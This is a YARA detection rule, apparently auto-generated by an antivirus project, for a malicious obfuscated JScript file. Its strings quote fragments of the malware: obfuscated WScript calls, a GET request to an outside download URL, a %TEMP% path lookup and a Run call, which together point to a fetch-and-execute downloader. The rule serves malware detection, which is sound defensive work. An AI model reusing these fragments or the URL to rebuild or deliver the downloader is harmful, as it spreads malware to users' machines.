rule sig_20160428_0bfefc1fcbc6c6375c19b2e221c27a48 {
  meta:
    description = "datamaliciousorder - file 20160428_0bfefc1fcbc6c6375c19b2e221c27a48.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6384981489fda1144f102e9f0cecbde57c74f86c88ce728abf940c213fda381b"

  strings:
    $s1  = "function FitNxaQbfBwrMgyRjlQnn(IkoDtdDclDkdLygQgiEtj, XbmAppTthNbxRlnNjyWyb){HpeMvyChiWdvDvfGamKkb = HpeMvyChiWdvDvfGamKkb * 1; " ascii
    $s2  = "return IkoDtdDclDkdLygQgiEtj - XbmAppTthNbxRlnNjyWyb;};" fullword ascii
    $s3  = "TmgAncIufLqyGqwQgsYpa[KrzJemRznKwuKyjSunGgh](\"G\" + \"ET\", \"http://dotatest.ru/zowjsk\", false);" fullword ascii
    $s4  = "var GrrHlrKztVvwDnrWchKmw = this[\"WScript\"];" fullword ascii
    $s5  = "function ZoqOmyTlcWjnWxdVjiFlj(DioZhdCalSouWjnXqaIgn){RcaYbkVfoKytFrxFmgAxv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "function KzbPsxUqlMclJtmGpfQxw() {return RcaYbkVfoKytFrxFmgAxv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "}while (JrvIkgNsyAhmFtpBomIss);" fullword ascii
    $s8  = "function ZoqOmyTlcWjnWxdVjiFlj(DioZhdCalSouWjnXqaIgn){RcaYbkVfoKytFrxFmgAxv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s9  = "function FitNxaQbfBwrMgyRjlQnn(IkoDtdDclDkdLygQgiEtj, XbmAppTthNbxRlnNjyWyb){HpeMvyChiWdvDvfGamKkb = HpeMvyChiWdvDvfGamKkb * 1; " ascii
    $s10 = "if (TmgAncIufLqyGqwQgsYpa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "var RcaYbkVfoKytFrxFmgAxv = function QqxTwkHzvLekQrfKuuRfo() {return GrrHlrKztVvwDnrWchKmw[EonAhzRaqOkaFsbFvsOhm](\"WScript\"+\"" ascii
    $s12 = "function WaaXslPfhFyvYcfFcxTss(){return ZnoYzvXucQdwQxjWfkMut + \"\";};" fullword ascii
    $s13 = "function ZizNxnItzUpoTngGinEol() {return ((YpzDhnHpxLleFikAhdHeq == true) && (YpzDhnHpxLleFikAhdHeq == DbhMwbZgwMkcIbwAmiIin)) ?" ascii
    $s14 = "function ZizNxnItzUpoTngGinEol() {return ((YpzDhnHpxLleFikAhdHeq == true) && (YpzDhnHpxLleFikAhdHeq == DbhMwbZgwMkcIbwAmiIin)) ?" ascii
    $s15 = "var RcaYbkVfoKytFrxFmgAxv = function QqxTwkHzvLekQrfKuuRfo() {return GrrHlrKztVvwDnrWchKmw[EonAhzRaqOkaFsbFvsOhm](\"WScript\"+\"" ascii
    $s16 = "function KzbPsxUqlMclJtmGpfQxw() {return RcaYbkVfoKytFrxFmgAxv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s17 = "YpzDhnHpxLleFikAhdHeq = true; " fullword ascii
    $s18 = "function YfnKweIrnVjgZxxRwfBce()" fullword ascii
    $s19 = "function KccPkcRhmXzdWspWbnGkk(){return EonAhzRaqOkaFsbFvsOhm;};" fullword ascii
    $s20 = "UcvWwtGbdHutGmcIyvMdu = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}